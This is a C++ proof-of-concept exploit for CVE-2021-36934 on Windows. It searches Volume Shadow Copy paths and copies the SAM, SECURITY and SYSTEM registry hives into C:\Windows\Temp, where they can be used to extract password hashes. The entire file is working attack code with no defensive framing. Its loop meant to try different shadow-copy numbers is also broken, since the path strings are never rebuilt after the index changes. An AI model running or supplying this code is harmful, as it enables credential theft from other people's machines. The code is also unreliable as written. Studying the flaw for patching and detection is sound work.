// CVE-2021-36934
// Hives are readable for everyone - VSS - BUILTIN\Users
// https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934

#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>


using namespace std;
namespace fs = std::filesystem;

bool exists_file(const string& name) {
    ifstream f(name.c_str());
    return f.good();
}

int main()
{
    // Path to shadow volumes (VSS) - Should be enabled by default on windows
    // \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
    // Number of the HarddiskVolumeShadowCopy<Number> can vary ... Let's bruteforce

    int index = 1 ;
    // SAM & SECURITY & SYSTEM
    string PATH_SAM = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + to_string(index) + "\\Windows\\System32\\config\\SAM";
    string PATH_SEC = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + to_string(index) + "\\Windows\\System32\\config\\SECURITY";
    string PATH_SYS = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + to_string(index) + "\\Windows\\System32\\config\\SYSTEM";

    string TMP_FILE = "C:\\Windows\\Temp\\";

    bool FOUND_FILES = false;
    
    for (int i = 0; i <= 30; i++) {
        if (exists_file(PATH_SAM)) {
            cout << "[+] Found Volume at Index : " + to_string(index) << "\n";
            FOUND_FILES = true;
            break;
        }
        else {
            cout << "[+] Nothing at Index : " + to_string(index) << "\n";
            index += 1;
        }
    }

    if (FOUND_FILES) {
        const auto copyOptions = fs::copy_options::overwrite_existing;

        cout << "[+] Copying files to " + TMP_FILE << "\n";
        fs::copy(PATH_SAM, TMP_FILE + "SAM", copyOptions);
        cout << "[+] SAM FILE COPIED " << "\n";
        fs::copy(PATH_SEC, TMP_FILE + "SECURITY", copyOptions);
        cout << "[+] SECURITY FILE COPIED " << "\n";
        fs::copy(PATH_SYS, TMP_FILE + "SYSTEM", copyOptions);
        cout << "[+] SYSTEM FILE COPIED " << "\n";
    }

    return 0;
}
